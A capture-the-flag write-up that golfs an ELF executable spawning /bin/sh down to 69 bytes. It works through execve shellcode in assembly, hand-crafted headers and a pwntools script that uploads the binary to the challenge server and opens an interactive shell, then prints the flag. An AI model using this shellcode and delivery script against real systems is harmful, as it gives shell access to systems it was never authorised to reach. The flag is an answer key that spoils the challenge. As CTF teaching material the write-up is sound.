# shELFing [173 solves]
## Challenge
here's a brief of the challenge in just words. your goal is to supply an executable to the remote server, such that the size of the executable does not exceed `76 bytes` and we should be able to pop a shell with that.

# Solution
## Analysis
it's already clear from the challenge statement that we need to do an ELF golfing. so i googled up ELF golfing and found out this nice article: 
> https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html

however, this article describes how to golf the following piece of code 
```c
int main() {
    return 42;
}
```
as opposed to what we desire
```c
#include <stdlib.h>

int main() {
    system("/bin/sh")'
}
```
if you were to simply compile this program with `gcc`. the executable size is over `20000` bytes. humongous as compared to the target size: `76 bytes`!
## Assembly to Drop a Shell
how about we start with the assembly that just invokes the `syscall execve()`. i wrote a `64-bit intel assembly` to do the same
```s {filename=shell.s, linenos=table}
section .data
    msg: db "/bin/sh", 0

section .text
    global _start

_start:
    xor rax, rax
    mov rdi, msg
    mov rsi, rax
    mov rdx, rax
    mov rax, 59
    syscall
```
to generate an executable we assemble this using `nasm` and link it using `ld`
```bash
nasm -f elf64 shell.s
ld shell.o -o shell
./shell
```
it seems to work fine. lets's check the size of the executable.
```bash
$ wc -c shell
8832 $ |
```
`8832` bytes is a really huge number. so we have no other choice than to resort to writing out our own ELF header.

## 64-bit ELF
an ELF comprises of four major components:
- ELF Header
- Program Header
- Sections
- Section Header

> quoting from https://gist.github.com/x0nu11byt3/bcb35c3de461e5fb66173071a2379779
"he program header table provides a segment view of the binary, as opposed to the section view provided by the section header table. The section view of an ELF binary, is meant for static-linking purposes only.

In contrast, the segment view, is used by the operating system and dynamic-linker when loading an ELF into a process for execution to locate the relevant code and data and decide what to load into virtual memory."

and as mentioned in the article, it's not harmful to drop the `Section Header`. 

we still however absolutely need the `ELF Header` and the `Program Header`

### ELF Header (64-bit)
```c
typedef struct
{
  unsigned char	e_ident[EI_NIDENT];	/* Magic number and other info */
  Elf64_Half	e_type;			/* Object file type */
  Elf64_Half	e_machine;		/* Architecture */
  Elf64_Word	e_version;		/* Object file version */
  Elf64_Addr	e_entry;		/* Entry point virtual address */
  Elf64_Off	e_phoff;		/* Program header table file offset */
  Elf64_Off	e_shoff;		/* Section header table file offset */
  Elf64_Word	e_flags;		/* Processor-specific flags */
  Elf64_Half	e_ehsize;		/* ELF header size in bytes */
  Elf64_Half	e_phentsize;		/* Program header table entry size */
  Elf64_Half	e_phnum;		/* Program header table entry count */
  Elf64_Half	e_shentsize;		/* Section header table entry size */
  Elf64_Half	e_shnum;		/* Section header table entry count */
  Elf64_Half	e_shstrndx;		/* Section header string table index */
} Elf64_Ehdr;
```

### Program Header (64-bit)
```c
typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;
```

using the above mentioned formats, i crafted the `ehdr` and `phdr` 
```s {filename=shell.s, linenos=table}
bits 64
org 0x400000
ehdr:
        db  0x7f, "ELF", 2, 1, 1, 0
times 8 db  0
        dw  2
        dw  62
        dd  1
        dq  _start 
        dq  phdr - $$ 
        dq  0
        dd  0 
        dw  ehdrsize
        dw  phdrsize
        dw  1
        dw  0
        dw  0
        dw  0

ehdrsize    equ     $ - ehdr

phdr:
        dd  1
        dd  5
        dq  0
        dq  $$
        dq  $$
        dq  filesize
        dq  filesize
        dq  0x1000

phdrsize    equ     $ - phdr

section .data
    msg:    db  "/bin/sh",  0

_start:
    xor rax, rax
    mov rdi, msg
    mov rsi, rax
    mov rdx, rax
    mov rax, 59
    syscall

filesize    equ     $ - $$
```
just for ref: `db, dw, dd, dq` correspond to `1, 2, 4, 8` bytes. next i turned this assembly into an executable
```bash
nasm -f bin -o shell shell.s
```
and it works as expected. let's check the size of the executable
```bash
$ wc -c tiny
154 $ |
```
so it's still `154 bytes` and we still have a long way to go. i still had to optimise this. i wondered if i could shorten up the assembly

## Golfing the .text section
the `.text` section took about `34 bytes` itself. first of all, it's possible to completely get rid of the `.data section`. we need to move the string directly into a register, then pop it onto the stack. now the address corresponding to the string is just the stack pointer (the `rsp`).

```shell.s {filename=shell.s, linenos=table}
_start:
    xor rax, rax
    push rax 
    mov rdi, 0x68732f6e69622f2f
    push rdi 

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
```
the `.text section` drops to just `31 bytes` now. if observe carefully, some assembly instructions in there are just simply redundant. once we get rid of these, this drops to a mere `22 bytes`
```shell.s {filename=shell.s, linenos=table}
_start:
    push rax 
    mov rdi, 0x68732f6e69622f2f
    push rdi 

    mov rdi, rsp
    mov rax, 59
    syscall
```
despite all that, the overall size of the executable is still `142 bytes`
```bash
$ wc -c tiny
142 $ |
```
we need to almost cut the size by half!
## Switching to 32-bit ELF
we noticed that `x86_64` is actually backwards compatible and it therefore can execute `32-bit` executables given that the headers used are appropriate. i switched all my progress to the `32-bit` format and the size of the executable drops to `105 bytes`!
```shell.s {filename=shell.s, linenos=table}
bits 32
org     0x08048000
  
ehdr:                                                 ; Elf32_Ehdr
        db      0x7F, "ELF", 1, 1, 1, 0         ;   e_ident
times 8 db      0
        dw      2                               ;   e_type
        dw      3                               ;   e_machine
        dd      1                               ;   e_version
        dd      _start                          ;   e_entry
        dd      phdr - $$                       ;   e_phoff
        dd      0                               ;   e_shoff
        dd      0                               ;   e_flags
        dw      ehdrsize                        ;   e_ehsize
        dw      phdrsize                        ;   e_phentsize
        dw      1                               ;   e_phnum
        dw      0                               ;   e_shentsize
        dw      0                               ;   e_shnum
        dw      0                               ;   e_shstrndx
  
ehdrsize      equ     $ - ehdr
  
phdr:                                                 ; Elf32_Phdr
        dd      1                               ;   p_type
        dd      0                               ;   p_offset
        dd      $$                              ;   p_vaddr
        dd      $$                              ;   p_paddr
        dd      filesize                        ;   p_filesz
        dd      filesize                        ;   p_memsz
        dd      5                               ;   p_flags
        dd      0x1000                          ;   p_align
  
phdrsize      equ     $ - phdr

_start:
    push    eax
    push    0x68732f6e  ; 'n/sh'
    push    0x69622f2f  ; '//bi'
    mov     ebx, esp    ; pointer to '/bin/sh\0'
    push    eax
    push    ebx
    mov     ecx, esp    ; pointer to argv
    mov     al, 0xb     ; syscall number for execve
    int     0x80
  
filesize      equ     $ - $$
```

we could try golfing the `.text section` again. currently, it's about `21 bytes` in size. i was able to cut-down `4 bytes` more.

```shell.s {filename=shell.s, linenos=table}
_start:      
    push   eax              
    push   0x68732f6e       
    push   0x69622f2f       
    mov    ebx, esp         
    mov    al, 0xb          
    int    0x80
```
so that brings us to `101 bytes`!

## Embedding PHDR inside EHDR
if you scroll down to the bottom of the article, the article authose explains how it's possible to merge the `program header` completely within the `ELF header`. since the `ELF header` on `32-bit` system is `52 bytes` large, we'll able to cut down `48 bytes` in this optimization! we can then append out `.text section` right below the headers. this should bring the executable size to `69 bytes` which fits right into the constraints.

```shell.s {filename=shell.s, linenos=table}
BITS 32

            org     0x00010000

            db      0x7F, "ELF"             ; e_ident
            dd      1                                       ; p_type
            dd      0                                       ; p_offset
            dd      $$                                      ; p_vaddr 
            dw      2                       ; e_type        ; p_paddr
            dw      3                       ; e_machine
            dd      _start                  ; e_version     ; p_filesz
            dd      _start                  ; e_entry       ; p_memsz
            dd      4                       ; e_phoff       ; p_flags
fake:
            mov     bl, 42                  ; e_shoff       ; p_align
            xor     eax, eax
            inc     eax                     ; e_flags
            int     0x80
            db      0
            dw      0x34                    ; e_ehsize
            dw      0x20                    ; e_phentsize
            dw      1                       ; e_phnum
            dw      0                       ; e_shentsize
            dw      0                       ; e_shnum
            dw      0                       ; e_shstrndx
_start:
    push   eax              
    push   0x68732f6e       
    push   0x69622f2f       
    mov    ebx, esp         
    mov    al, 0xb          
    int    0x80

filesize      equ     $ - $$
```

here's `Makefile` that makes the executable generation steps a lot less clumsy.

```makefile
all: run
build:
    nasm -f bin -Ox -o shell shell.s
link: build
    chmod +x shell
run: link
    @ls -l shell | awk '{print $$5}' | xargs -I {} echo "size: {} bytes"
    @./shell
clean:
    rm shell.o shell
```

upon executing `make run` it seems to work fine! and we can confirm the size of the executable using `wc`
```bash
$ wc -c tiny
69 $ |
```

i prepared a small python script to test if this actually works
```py
import os 

filename = "./shell"
os.execve(filename, [filename], {})
```

and upon executing this python file, as anyone can confirm this certainly works! i grabbed the executable and quickly wrote the a script to send this to the remote server.

```py
import os
import base64
from pwn import *

filename = "./tiny"

elf_data = open(filename, "rb").read()
content = base64.b64encode(elf_data)

host = '89.169.156.185'
port = 10200
r = remote(host, port, level='DEBUG')

r.sendlineafter(b'ELF x64 executable: ', content)
r.interactive()

```

and that gives us the shell as expected on the remote server!

## Flag
`brics+{0cc8bfea-ec2d-4e68-8c2e-7e55db59cd1a}`